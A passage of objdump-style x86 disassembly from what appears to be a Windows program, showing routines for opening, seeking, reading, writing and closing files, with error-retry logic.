  401da2:	0f 95 c0             	setne  %al
  401da5:	c3                   	ret
  401da6:	b8 54 10 00 00       	mov    $0x1054,%eax
  401dab:	e8 20 0e 01 00       	call   0x412bd0
  401db0:	53                   	push   %ebx
  401db1:	8b 9c 24 60 10 00 00 	mov    0x1060(%esp),%ebx
  401db8:	55                   	push   %ebp
  401db9:	57                   	push   %edi
  401dba:	8b f9                	mov    %ecx,%edi
  401dbc:	83 a7 20 10 00 00 00 	andl   $0x0,0x1020(%edi)
  401dc3:	80 7f 1d 00          	cmpb   $0x0,0x1d(%edi)
  401dc7:	75 09                	jne    0x401dd2
  401dc9:	f6 c3 04             	test   $0x4,%bl
  401dcc:	75 04                	jne    0x401dd2
  401dce:	32 c9                	xor    %cl,%cl
  401dd0:	eb 02                	jmp    0x401dd4
  401dd2:	b1 01                	mov    $0x1,%cl
  401dd4:	8b c3                	mov    %ebx,%eax
  401dd6:	d1 e8                	shr    $1,%eax
  401dd8:	56                   	push   %esi
  401dd9:	24 01                	and    $0x1,%al
  401ddb:	0f b6 f0             	movzbl %al,%esi
  401dde:	f7 de                	neg    %esi
  401de0:	1b f6                	sbb    %esi,%esi
  401de2:	81 e6 00 00 00 c0    	and    $0xc0000000,%esi
  401de8:	81 c6 00 00 00 80    	add    $0x80000000,%esi
  401dee:	f6 c3 01             	test   $0x1,%bl
  401df1:	74 06                	je     0x401df9
  401df3:	81 ce 00 00 00 40    	or     $0x40000000,%esi
  401df9:	c1 eb 03             	shr    $0x3,%ebx
  401dfc:	f7 d3                	not    %ebx
  401dfe:	83 e3 01             	and    $0x1,%ebx
  401e01:	84 c9                	test   %cl,%cl
  401e03:	74 03                	je     0x401e08
  401e05:	83 cb 02             	or     $0x2,%ebx
  401e08:	33 c0                	xor    %eax,%eax
  401e0a:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401e0e:	38 47 15             	cmp    %al,0x15(%edi)
  401e11:	0f 95 c0             	setne  %al
  401e14:	48                   	dec    %eax
  401e15:	25 00 00 00 08       	and    $0x8000000,%eax
  401e1a:	89 44 24 10          	mov    %eax,0x10(%esp)
  401e1e:	e8 72 fc ff ff       	call   0x401a95
  401e23:	80 7f 1c 00          	cmpb   $0x0,0x1c(%edi)
  401e27:	74 06                	je     0x401e2f
  401e29:	81 ce 00 01 00 00    	or     $0x100,%esi
  401e2f:	6a 00                	push   $0x0
  401e31:	ff 74 24 14          	push   0x14(%esp)
  401e35:	6a 03                	push   $0x3
  401e37:	6a 00                	push   $0x0
  401e39:	53                   	push   %ebx
  401e3a:	56                   	push   %esi
  401e3b:	ff b4 24 80 10 00 00 	push   0x1080(%esp)
  401e42:	ff 15 30 70 42 00    	call   *0x427030
  401e48:	8b e8                	mov    %eax,%ebp
  401e4a:	83 fd ff             	cmp    $0xffffffff,%ebp
  401e4d:	75 62                	jne    0x401eb1
  401e4f:	ff 15 00 70 42 00    	call   *0x427000
  401e55:	89 44 24 14          	mov    %eax,0x14(%esp)
  401e59:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401e5d:	68 00 08 00 00       	push   $0x800
  401e62:	50                   	push   %eax
  401e63:	ff b4 24 70 10 00 00 	push   0x1070(%esp)
  401e6a:	e8 59 14 00 00       	call   0x4032c8
  401e6f:	84 c0                	test   %al,%al
  401e71:	74 2d                	je     0x401ea0
  401e73:	6a 00                	push   $0x0
  401e75:	ff 74 24 14          	push   0x14(%esp)
  401e79:	8d 44 24 24          	lea    0x24(%esp),%eax
  401e7d:	6a 03                	push   $0x3
  401e7f:	6a 00                	push   $0x0
  401e81:	53                   	push   %ebx
  401e82:	56                   	push   %esi
  401e83:	50                   	push   %eax
  401e84:	ff 15 30 70 42 00    	call   *0x427030
  401e8a:	8b e8                	mov    %eax,%ebp
  401e8c:	ff 15 00 70 42 00    	call   *0x427000
  401e92:	83 f8 02             	cmp    $0x2,%eax
  401e95:	75 04                	jne    0x401e9b
  401e97:	89 44 24 14          	mov    %eax,0x14(%esp)
  401e9b:	83 fd ff             	cmp    $0xffffffff,%ebp
  401e9e:	75 11                	jne    0x401eb1
  401ea0:	83 7c 24 14 02       	cmpl   $0x2,0x14(%esp)
  401ea5:	75 0a                	jne    0x401eb1
  401ea7:	c7 87 20 10 00 00 01 	movl   $0x1,0x1020(%edi)
  401eae:	00 00 00 
  401eb1:	80 7f 1c 00          	cmpb   $0x0,0x1c(%edi)
  401eb5:	5e                   	pop    %esi
  401eb6:	74 1f                	je     0x401ed7
  401eb8:	83 fd ff             	cmp    $0xffffffff,%ebp
  401ebb:	74 1a                	je     0x401ed7
  401ebd:	83 4c 24 10 ff       	orl    $0xffffffff,0x10(%esp)
  401ec2:	8d 44 24 10          	lea    0x10(%esp),%eax
  401ec6:	83 4c 24 14 ff       	orl    $0xffffffff,0x14(%esp)
  401ecb:	6a 00                	push   $0x0
  401ecd:	50                   	push   %eax
  401ece:	6a 00                	push   $0x0
  401ed0:	55                   	push   %ebp
  401ed1:	ff 15 28 70 42 00    	call   *0x427028
  401ed7:	33 c0                	xor    %eax,%eax
  401ed9:	83 fd ff             	cmp    $0xffffffff,%ebp
  401edc:	88 47 12             	mov    %al,0x12(%edi)
  401edf:	0f 95 c3             	setne  %bl
  401ee2:	89 47 0c             	mov    %eax,0xc(%edi)
  401ee5:	88 47 10             	mov    %al,0x10(%edi)
  401ee8:	83 fd ff             	cmp    $0xffffffff,%ebp
  401eeb:	74 18                	je     0x401f05
  401eed:	68 00 08 00 00       	push   $0x800
  401ef2:	ff b4 24 68 10 00 00 	push   0x1068(%esp)
  401ef9:	8d 4f 1e             	lea    0x1e(%edi),%ecx
  401efc:	89 6f 04             	mov    %ebp,0x4(%edi)
  401eff:	51                   	push   %ecx
  401f00:	e8 d6 46 00 00       	call   0x4065db
  401f05:	5f                   	pop    %edi
  401f06:	5d                   	pop    %ebp
  401f07:	8a c3                	mov    %bl,%al
  401f09:	5b                   	pop    %ebx
  401f0a:	81 c4 54 10 00 00    	add    $0x1054,%esp
  401f10:	c2 08 00             	ret    $0x8
  401f13:	55                   	push   %ebp
  401f14:	8b ec                	mov    %esp,%ebp
  401f16:	53                   	push   %ebx
  401f17:	8b d9                	mov    %ecx,%ebx
  401f19:	83 7b 04 ff          	cmpl   $0xffffffff,0x4(%ebx)
  401f1d:	74 63                	je     0x401f82
  401f1f:	56                   	push   %esi
  401f20:	8b 75 08             	mov    0x8(%ebp),%esi
  401f23:	57                   	push   %edi
  401f24:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401f27:	85 ff                	test   %edi,%edi
  401f29:	7f 28                	jg     0x401f53
  401f2b:	7c 04                	jl     0x401f31
  401f2d:	85 f6                	test   %esi,%esi
  401f2f:	73 22                	jae    0x401f53
  401f31:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401f34:	85 c9                	test   %ecx,%ecx
  401f36:	74 1e                	je     0x401f56
  401f38:	83 f9 01             	cmp    $0x1,%ecx
  401f3b:	8b cb                	mov    %ebx,%ecx
  401f3d:	75 07                	jne    0x401f46
  401f3f:	8b 03                	mov    (%ebx),%eax
  401f41:	ff 50 14             	call   *0x14(%eax)
  401f44:	eb 05                	jmp    0x401f4b
  401f46:	e8 e6 fd ff ff       	call   0x401d31
  401f4b:	03 f0                	add    %eax,%esi
  401f4d:	13 fa                	adc    %edx,%edi
  401f4f:	33 c9                	xor    %ecx,%ecx
  401f51:	eb 03                	jmp    0x401f56
  401f53:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401f56:	8b c7                	mov    %edi,%eax
  401f58:	89 7d 10             	mov    %edi,0x10(%ebp)
  401f5b:	c1 f8 1f             	sar    $0x1f,%eax
  401f5e:	51                   	push   %ecx
  401f5f:	8d 45 10             	lea    0x10(%ebp),%eax
  401f62:	50                   	push   %eax
  401f63:	56                   	push   %esi
  401f64:	ff 73 04             	push   0x4(%ebx)
  401f67:	ff 15 24 70 42 00    	call   *0x427024
  401f6d:	5f                   	pop    %edi
  401f6e:	5e                   	pop    %esi
  401f6f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401f72:	75 0e                	jne    0x401f82
  401f74:	ff 15 00 70 42 00    	call   *0x427000
  401f7a:	85 c0                	test   %eax,%eax
  401f7c:	74 04                	je     0x401f82
  401f7e:	32 c0                	xor    %al,%al
  401f80:	eb 02                	jmp    0x401f84
  401f82:	b0 01                	mov    $0x1,%al
  401f84:	5b                   	pop    %ebx
  401f85:	5d                   	pop    %ebp
  401f86:	c2 0c 00             	ret    $0xc
  401f89:	51                   	push   %ecx
  401f8a:	51                   	push   %ecx
  401f8b:	53                   	push   %ebx
  401f8c:	55                   	push   %ebp
  401f8d:	56                   	push   %esi
  401f8e:	8b f1                	mov    %ecx,%esi
  401f90:	33 db                	xor    %ebx,%ebx
  401f92:	57                   	push   %edi
  401f93:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401f97:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  401f9b:	38 5e 11             	cmp    %bl,0x11(%esi)
  401f9e:	74 0d                	je     0x401fad
  401fa0:	8b 06                	mov    (%esi),%eax
  401fa2:	ff 50 14             	call   *0x14(%eax)
  401fa5:	89 44 24 10          	mov    %eax,0x10(%esp)
  401fa9:	89 54 24 14          	mov    %edx,0x14(%esp)
  401fad:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  401fb1:	55                   	push   %ebp
  401fb2:	ff 74 24 20          	push   0x20(%esp)
  401fb6:	8b ce                	mov    %esi,%ecx
  401fb8:	e8 dd fc ff ff       	call   0x401c9a
  401fbd:	8b f8                	mov    %eax,%edi
  401fbf:	83 ff ff             	cmp    $0xffffffff,%edi
  401fc2:	0f 85 89 00 00 00    	jne    0x402051
  401fc8:	c7 86 20 10 00 00 02 	movl   $0x2,0x1020(%esi)
  401fcf:	00 00 00 
  401fd2:	38 5e 14             	cmp    %bl,0x14(%esi)
  401fd5:	74 7a                	je     0x402051
  401fd7:	38 5e 11             	cmp    %bl,0x11(%esi)
  401fda:	75 27                	jne    0x402003
  401fdc:	39 5e 0c             	cmp    %ebx,0xc(%esi)
  401fdf:	75 12                	jne    0x401ff3
  401fe1:	8d 46 1e             	lea    0x1e(%esi),%eax
  401fe4:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  401fe9:	50                   	push   %eax
  401fea:	e8 ba f7 ff ff       	call   0x4017a9
  401fef:	84 c0                	test   %al,%al
  401ff1:	75 be                	jne    0x401fb1
  401ff3:	8d 46 1e             	lea    0x1e(%esi),%eax
  401ff6:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  401ffb:	50                   	push   %eax
  401ffc:	e8 f2 f8 ff ff       	call   0x4018f3
  402001:	eb 4e                	jmp    0x402051
  402003:	8b fb                	mov    %ebx,%edi
  402005:	85 ed                	test   %ebp,%ebp
  402007:	74 48                	je     0x402051
  402009:	8b 16                	mov    (%esi),%edx
  40200b:	33 c0                	xor    %eax,%eax
  40200d:	8b cb                	mov    %ebx,%ecx
  40200f:	03 4c 24 10          	add    0x10(%esp),%ecx
  402013:	6a 00                	push   $0x0
  402015:	13 44 24 18          	adc    0x18(%esp),%eax
  402019:	50                   	push   %eax
  40201a:	51                   	push   %ecx
  40201b:	8b ce                	mov    %esi,%ecx
  40201d:	ff 52 10             	call   *0x10(%edx)
  402020:	8b c5                	mov    %ebp,%eax
  402022:	b9 00 02 00 00       	mov    $0x200,%ecx
  402027:	2b c3                	sub    %ebx,%eax
  402029:	3b c1                	cmp    %ecx,%eax
  40202b:	72 02                	jb     0x40202f
  40202d:	8b c1                	mov    %ecx,%eax
  40202f:	50                   	push   %eax
  402030:	ff 74 24 20          	push   0x20(%esp)
  402034:	8b ce                	mov    %esi,%ecx
  402036:	e8 5f fc ff ff       	call   0x401c9a
  40203b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40203e:	75 05                	jne    0x402045
  402040:	b8 00 02 00 00       	mov    $0x200,%eax
  402045:	81 c3 00 02 00 00    	add    $0x200,%ebx
  40204b:	03 f8                	add    %eax,%edi
  40204d:	3b dd                	cmp    %ebp,%ebx
  40204f:	72 b8                	jb     0x402009
  402051:	8b c7                	mov    %edi,%eax
  402053:	5f                   	pop    %edi
  402054:	5e                   	pop    %esi
  402055:	5d                   	pop    %ebp
  402056:	5b                   	pop    %ebx
  402057:	59                   	pop    %ecx
  402058:	59                   	pop    %ecx
  402059:	c2 08 00             	ret    $0x8
  40205c:	56                   	push   %esi
  40205d:	ff 74 24 10          	push   0x10(%esp)
  402061:	8b f1                	mov    %ecx,%esi
  402063:	ff 74 24 10          	push   0x10(%esp)
  402067:	ff 74 24 10          	push   0x10(%esp)
  40206b:	e8 a3 fe ff ff       	call   0x401f13
  402070:	84 c0                	test   %al,%al
  402072:	75 13                	jne    0x402087
  402074:	38 46 14             	cmp    %al,0x14(%esi)
  402077:	74 0e                	je     0x402087
  402079:	8d 46 1e             	lea    0x1e(%esi),%eax
  40207c:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  402081:	50                   	push   %eax
  402082:	e8 b4 f8 ff ff       	call   0x40193b
  402087:	5e                   	pop    %esi
  402088:	c2 0c 00             	ret    $0xc
  40208b:	c2 08 00             	ret    $0x8
  40208e:	83 ec 1c             	sub    $0x1c,%esp
  402091:	53                   	push   %ebx
  402092:	55                   	push   %ebp
  402093:	57                   	push   %edi
  402094:	8b f9                	mov    %ecx,%edi
  402096:	81 7f 18 00 01 00 00 	cmpl   $0x100,0x18(%edi)
  40209d:	74 0f                	je     0x4020ae
  40209f:	f6 47 18 02          	testb  $0x2,0x18(%edi)
  4020a3:	75 09                	jne    0x4020ae
  4020a5:	ff 77 04             	push   0x4(%edi)
  4020a8:	ff 15 1c 70 42 00    	call   *0x42701c
  4020ae:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4020b2:	33 db                	xor    %ebx,%ebx
  4020b4:	43                   	inc    %ebx
  4020b5:	85 c9                	test   %ecx,%ecx
  4020b7:	74 0b                	je     0x4020c4
  4020b9:	8b 01                	mov    (%ecx),%eax
  4020bb:	0b 41 04             	or     0x4(%ecx),%eax
  4020be:	74 04                	je     0x4020c4
  4020c0:	8a d3                	mov    %bl,%dl
  4020c2:	eb 02                	jmp    0x4020c6
  4020c4:	32 d2                	xor    %dl,%dl
  4020c6:	56                   	push   %esi
  4020c7:	8b 74 24 34          	mov    0x34(%esp),%esi
  4020cb:	88 54 24 13          	mov    %dl,0x13(%esp)
  4020cf:	85 f6                	test   %esi,%esi
  4020d1:	74 0b                	je     0x4020de
  4020d3:	8b 06                	mov    (%esi),%eax
  4020d5:	0b 46 04             	or     0x4(%esi),%eax
  4020d8:	88 5c 24 30          	mov    %bl,0x30(%esp)
  4020dc:	75 05                	jne    0x4020e3
  4020de:	c6 44 24 30 00       	movb   $0x0,0x30(%esp)
  4020e3:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  4020e7:	85 ed                	test   %ebp,%ebp
  4020e9:	74 08                	je     0x4020f3
  4020eb:	8b 45 00             	mov    0x0(%ebp),%eax
  4020ee:	0b 45 04             	or     0x4(%ebp),%eax
  4020f1:	75 02                	jne    0x4020f5
  4020f3:	32 db                	xor    %bl,%bl
  4020f5:	84 d2                	test   %dl,%dl
  4020f7:	74 0a                	je     0x402103
  4020f9:	8d 44 24 14          	lea    0x14(%esp),%eax
  4020fd:	50                   	push   %eax
  4020fe:	e8 89 4d 00 00       	call   0x406e8c
  402103:	80 7c 24 30 00       	cmpb   $0x0,0x30(%esp)
  402108:	74 0c                	je     0x402116
  40210a:	8d 44 24 24          	lea    0x24(%esp),%eax
  40210e:	8b ce                	mov    %esi,%ecx
  402110:	50                   	push   %eax
  402111:	e8 76 4d 00 00       	call   0x406e8c
  402116:	5e                   	pop    %esi
  402117:	84 db                	test   %bl,%bl
  402119:	74 0c                	je     0x402127
  40211b:	8d 44 24 18          	lea    0x18(%esp),%eax
  40211f:	8b cd                	mov    %ebp,%ecx
  402121:	50                   	push   %eax
  402122:	e8 65 4d 00 00       	call   0x406e8c
  402127:	0f b6 44 24 0f       	movzbl 0xf(%esp),%eax
  40212c:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402130:	f7 d8                	neg    %eax
  402132:	1b c0                	sbb    %eax,%eax
  402134:	23 c1                	and    %ecx,%eax
  402136:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40213a:	50                   	push   %eax
  40213b:	0f b6 c3             	movzbl %bl,%eax
  40213e:	f7 d8                	neg    %eax
  402140:	1b c0                	sbb    %eax,%eax
  402142:	23 c1                	and    %ecx,%eax
  402144:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402148:	50                   	push   %eax
  402149:	0f b6 44 24 34       	movzbl 0x34(%esp),%eax
  40214e:	f7 d8                	neg    %eax
  402150:	1b c0                	sbb    %eax,%eax
  402152:	23 c1                	and    %ecx,%eax
  402154:	50                   	push   %eax
  402155:	ff 77 04             	push   0x4(%edi)
  402158:	ff 15 28 70 42 00    	call   *0x427028
  40215e:	5f                   	pop    %edi
  40215f:	5d                   	pop    %ebp
  402160:	5b                   	pop    %ebx
  402161:	83 c4 1c             	add    $0x1c,%esp
  402164:	c2 0c 00             	ret    $0xc
  402167:	51                   	push   %ecx
  402168:	53                   	push   %ebx
  402169:	55                   	push   %ebp
  40216a:	56                   	push   %esi
  40216b:	8b f1                	mov    %ecx,%esi
  40216d:	83 cb ff             	or     $0xffffffff,%ebx
  402170:	bd d4 0c 45 00       	mov    $0x450cd4,%ebp
  402175:	39 5e 04             	cmp    %ebx,0x4(%esi)
  402178:	75 11                	jne    0x40218b
  40217a:	80 7e 14 00          	cmpb   $0x0,0x14(%esi)
  40217e:	74 5a                	je     0x4021da
  402180:	8d 46 1e             	lea    0x1e(%esi),%eax
  402183:	8b cd                	mov    %ebp,%ecx
  402185:	50                   	push   %eax
  402186:	e8 b0 f7 ff ff       	call   0x40193b
  40218b:	83 64 24 0c 00       	andl   $0x0,0xc(%esp)
  402190:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402194:	57                   	push   %edi
  402195:	6a 01                	push   $0x1
  402197:	50                   	push   %eax
  402198:	6a 00                	push   $0x0
  40219a:	ff 76 04             	push   0x4(%esi)
  40219d:	ff 15 24 70 42 00    	call   *0x427024
  4021a3:	8b f8                	mov    %eax,%edi
  4021a5:	3b fb                	cmp    %ebx,%edi
  4021a7:	75 1b                	jne    0x4021c4
  4021a9:	ff 15 00 70 42 00    	call   *0x427000
  4021af:	85 c0                	test   %eax,%eax
  4021b1:	74 11                	je     0x4021c4
  4021b3:	80 7e 14 00          	cmpb   $0x0,0x14(%esi)
  4021b7:	74 27                	je     0x4021e0
  4021b9:	8d 46 1e             	lea    0x1e(%esi),%eax
  4021bc:	8b cd                	mov    %ebp,%ecx
  4021be:	50                   	push   %eax
  4021bf:	e8 77 f7 ff ff       	call   0x40193b
  4021c4:	8b 44 24 10          	mov    0x10(%esp),%eax
  4021c8:	33 c9                	xor    %ecx,%ecx
  4021ca:	99                   	cltd
  4021cb:	03 cf                	add    %edi,%ecx
  4021cd:	8b d0                	mov    %eax,%edx
  4021cf:	8b c1                	mov    %ecx,%eax
  4021d1:	83 d2 00             	adc    $0x0,%edx
  4021d4:	5f                   	pop    %edi
  4021d5:	5e                   	pop    %esi
  4021d6:	5d                   	pop    %ebp
  4021d7:	5b                   	pop    %ebx
  4021d8:	59                   	pop    %ecx
  4021d9:	c3                   	ret
  4021da:	8b c3                	mov    %ebx,%eax
  4021dc:	8b d3                	mov    %ebx,%edx
  4021de:	eb f5                	jmp    0x4021d5
  4021e0:	8b c3                	mov    %ebx,%eax
  4021e2:	8b d3                	mov    %ebx,%edx
  4021e4:	eb ee                	jmp    0x4021d4
  4021e6:	ff 71 04             	push   0x4(%ecx)
  4021e9:	ff 15 20 70 42 00    	call   *0x427020
  4021ef:	48                   	dec    %eax
  4021f0:	f7 d8                	neg    %eax
  4021f2:	1b c0                	sbb    %eax,%eax
  4021f4:	40                   	inc    %eax
  4021f5:	c3                   	ret
  4021f6:	55                   	push   %ebp
  4021f7:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  4021fb:	57                   	push   %edi
  4021fc:	8b f9                	mov    %ecx,%edi
  4021fe:	85 ed                	test   %ebp,%ebp
  402200:	75 07                	jne    0x402209
  402202:	b0 01                	mov    $0x1,%al
  402204:	e9 ee 00 00 00       	jmp    0x4022f7
  402209:	83 7f 0c 01          	cmpl   $0x1,0xc(%edi)
  40220d:	75 0b                	jne    0x40221a
  40220f:	6a f5                	push   $0xfffffff5
  402211:	ff 15 10 70 42 00    	call   *0x427010
  402217:	89 47 04             	mov    %eax,0x4(%edi)
  40221a:	53                   	push   %ebx
  40221b:	56                   	push   %esi
  40221c:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  402221:	32 db                	xor    %bl,%bl
  402223:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  402227:	74 46                	je     0x40226f
  402229:	33 f6                	xor    %esi,%esi
  40222b:	85 ed                	test   %ebp,%ebp
  40222d:	74 62                	je     0x402291
  40222f:	8b c5                	mov    %ebp,%eax
  402231:	2b c6                	sub    %esi,%eax
  402233:	3d 00 40 00 00       	cmp    $0x4000,%eax
  402238:	72 05                	jb     0x40223f
  40223a:	b8 00 40 00 00       	mov    $0x4000,%eax
  40223f:	6a 00                	push   $0x0
  402241:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402245:	51                   	push   %ecx
  402246:	50                   	push   %eax
  402247:	8b 44 24 20          	mov    0x20(%esp),%eax
  40224b:	03 c6                	add    %esi,%eax
  40224d:	50                   	push   %eax
  40224e:	ff 77 04             	push   0x4(%edi)
  402251:	ff 15 14 70 42 00    	call   *0x427014
  402257:	8d 58 ff             	lea    -0x1(%eax),%ebx
  40225a:	f7 db                	neg    %ebx
  40225c:	1a db                	sbb    %bl,%bl
  40225e:	80 c3 01             	add    $0x1,%bl
  402261:	74 2e                	je     0x402291
  402263:	81 c6 00 40 00 00    	add    $0x4000,%esi
  402269:	3b f5                	cmp    %ebp,%esi
  40226b:	72 c2                	jb     0x40222f
  40226d:	eb 1e                	jmp    0x40228d
  40226f:	6a 00                	push   $0x0
  402271:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402275:	50                   	push   %eax
  402276:	55                   	push   %ebp
  402277:	ff 74 24 20          	push   0x20(%esp)
  40227b:	ff 77 04             	push   0x4(%edi)
  40227e:	ff 15 14 70 42 00    	call   *0x427014
  402284:	48                   	dec    %eax
  402285:	f7 d8                	neg    %eax
  402287:	1a c0                	sbb    %al,%al
  402289:	fe c0                	inc    %al
  40228b:	8a d8                	mov    %al,%bl
  40228d:	84 db                	test   %bl,%bl
  40228f:	75 5e                	jne    0x4022ef
  402291:	80 7f 14 00          	cmpb   $0x0,0x14(%edi)
  402295:	74 58                	je     0x4022ef
  402297:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  40229b:	75 52                	jne    0x4022ef
  40229d:	6a 00                	push   $0x0
  40229f:	8d 77 1e             	lea    0x1e(%edi),%esi
  4022a2:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  4022a7:	56                   	push   %esi
  4022a8:	e8 01 f5 ff ff       	call   0x4017ae
  4022ad:	84 c0                	test   %al,%al
  4022af:	74 31                	je     0x4022e2
  4022b1:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  4022b5:	0f 83 61 ff ff ff    	jae    0x40221c
  4022bb:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  4022c0:	0f 86 56 ff ff ff    	jbe    0x40221c
  4022c6:	8b 37                	mov    (%edi),%esi
  4022c8:	8b cf                	mov    %edi,%ecx
  4022ca:	6a 00                	push   $0x0
  4022cc:	ff 56 14             	call   *0x14(%esi)
  4022cf:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  4022d3:	8b cf                	mov    %edi,%ecx
  4022d5:	83 da 00             	sbb    $0x0,%edx
  4022d8:	52                   	push   %edx
  4022d9:	50                   	push   %eax
  4022da:	ff 56 10             	call   *0x10(%esi)
  4022dd:	e9 3a ff ff ff       	jmp    0x40221c
  4022e2:	56                   	push   %esi
  4022e3:	6a 00                	push   $0x0
  4022e5:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  4022ea:	e8 05 f7 ff ff       	call   0x4019f4
  4022ef:	5e                   	pop    %esi
  4022f0:	8a c3                	mov    %bl,%al
  4022f2:	c6 47 08 01          	movb   $0x1,0x8(%edi)
  4022f6:	5b                   	pop    %ebx
  4022f7:	5f                   	pop    %edi
  4022f8:	5d                   	pop    %ebp
  4022f9:	c2 08 00             	ret    $0x8
  4022fc:	b8 04 10 00 00       	mov    $0x1004,%eax
  402301:	e8 ca 08 01 00       	call   0x412bd0
  402306:	56                   	push   %esi
  402307:	8b b4 24 0c 10 00 00 	mov    0x100c(%esp),%esi
  40230e:	85 f6                	test   %esi,%esi
  402310:	0f 84 b8 00 00 00    	je     0x4023ce
  402316:	33 c0                	xor    %eax,%eax
  402318:	66 39 06             	cmp    %ax,(%esi)
  40231b:	0f 84 ad 00 00 00    	je     0x4023ce
  402321:	53                   	push   %ebx
  402322:	57                   	push   %edi
  402323:	b3 01                	mov    $0x1,%bl
  402325:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402329:	8b fe                	mov    %esi,%edi
  40232b:	55                   	push   %ebp
  40232c:	8b e8                	mov    %eax,%ebp
  40232e:	d1 fd                	sar    $1,%ebp
  402330:	81 fd 00 08 00 00    	cmp    $0x800,%ebp
  402336:	73 5f                	jae    0x402397
  402338:	0f b7 07             	movzwl (%edi),%eax
  40233b:	50                   	push   %eax
  40233c:	e8 78 11 00 00       	call   0x4034b9
  402341:	84 c0                	test   %al,%al
  402343:	74 3d                	je     0x402382
  402345:	3b fe                	cmp    %esi,%edi
  402347:	76 39                	jbe    0x402382
  402349:	8d 46 04             	lea    0x4(%esi),%eax
  40234c:	3b f8                	cmp    %eax,%edi
  40234e:	75 07                	jne    0x402357
  402350:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  402355:	74 2b                	je     0x402382
  402357:	55                   	push   %ebp
  402358:	8d 44 24 18          	lea    0x18(%esp),%eax
  40235c:	56                   	push   %esi
  40235d:	50                   	push   %eax
  40235e:	e8 12 7c 01 00       	call   0x419f75
  402363:	83 c4 0c             	add    $0xc,%esp
  402366:	33 c0                	xor    %eax,%eax
  402368:	66 89 44 6c 14       	mov    %ax,0x14(%esp,%ebp,2)
  40236d:	50                   	push   %eax
  40236e:	6a 01                	push   $0x1
  402370:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402374:	50                   	push   %eax
  402375:	e8 49 01 00 00       	call   0x4024c3
  40237a:	8b d8                	mov    %eax,%ebx
  40237c:	f7 db                	neg    %ebx
  40237e:	1a db                	sbb    %bl,%bl
  402380:	fe c3                	inc    %bl
  402382:	8b 44 24 10          	mov    0x10(%esp),%eax
  402386:	83 c7 02             	add    $0x2,%edi
  402389:	83 c0 02             	add    $0x2,%eax
  40238c:	33 c9                	xor    %ecx,%ecx
  40238e:	89 44 24 10          	mov    %eax,0x10(%esp)
  402392:	66 39 0f             	cmp    %cx,(%edi)
  402395:	75 95                	jne    0x40232c
  402397:	80 bc 24 1c 10 00 00 	cmpb   $0x0,0x101c(%esp)
  40239e:	00 
  40239f:	5d                   	pop    %ebp
  4023a0:	75 26                	jne    0x4023c8
  4023a2:	56                   	push   %esi
  4023a3:	e8 2f 12 00 00       	call   0x4035d7
  4023a8:	0f b7 00             	movzwl (%eax),%eax
  4023ab:	50                   	push   %eax
  4023ac:	e8 08 11 00 00       	call   0x4034b9
  4023b1:	84 c0                	test   %al,%al
  4023b3:	75 13                	jne    0x4023c8
  4023b5:	33 c0                	xor    %eax,%eax
  4023b7:	50                   	push   %eax
  4023b8:	6a 01                	push   $0x1
  4023ba:	56                   	push   %esi
  4023bb:	e8 03 01 00 00       	call   0x4024c3
  4023c0:	f7 d8                	neg    %eax
  4023c2:	1a c0                	sbb    %al,%al
  4023c4:	fe c0                	inc    %al
  4023c6:	8a d8                	mov    %al,%bl
  4023c8:	5f                   	pop    %edi
  4023c9:	8a c3                	mov    %bl,%al
  4023cb:	5b                   	pop    %ebx
  4023cc:	eb 02                	jmp    0x4023d0
  4023ce:	32 c0                	xor    %al,%al
  4023d0:	5e                   	pop    %esi
  4023d1:	81 c4 04 10 00 00    	add    $0x1004,%esp
  4023d7:	c2 08 00             	ret    $0x8
  4023da:	55                   	push   %ebp
  4023db:	8b ec                	mov    %esp,%ebp
  4023dd:	b8 00 10 00 00       	mov    $0x1000,%eax
  4023e2:	e8 e9 07 01 00       	call   0x412bd0
  4023e7:	53                   	push   %ebx
  4023e8:	ff 75 08             	push   0x8(%ebp)
  4023eb:	ff 15 40 70 42 00    	call   *0x427040
  4023f1:	85 c0                	test   %eax,%eax
  4023f3:	0f 95 c3             	setne  %bl
  4023f6:	84 db                	test   %bl,%bl
  4023f8:	75 2a                	jne    0x402424
  4023fa:	68 00 08 00 00       	push   $0x800
  4023ff:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  402405:	50                   	push   %eax
  402406:	ff 75 08             	push   0x8(%ebp)
  402409:	e8 ba 0e 00 00       	call   0x4032c8
  40240e:	84 c0                	test   %al,%al
  402410:	74 12                	je     0x402424
  402412:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  402418:	50                   	push   %eax
  402419:	ff 15 40 70 42 00    	call   *0x427040
  40241f:	85 c0                	test   %eax,%eax
  402421:	0f 95 c3             	setne  %bl
  402424:	8a c3                	mov    %bl,%al
  402426:	5b                   	pop    %ebx
  402427:	8b e5                	mov    %ebp,%esp
  402429:	5d                   	pop    %ebp
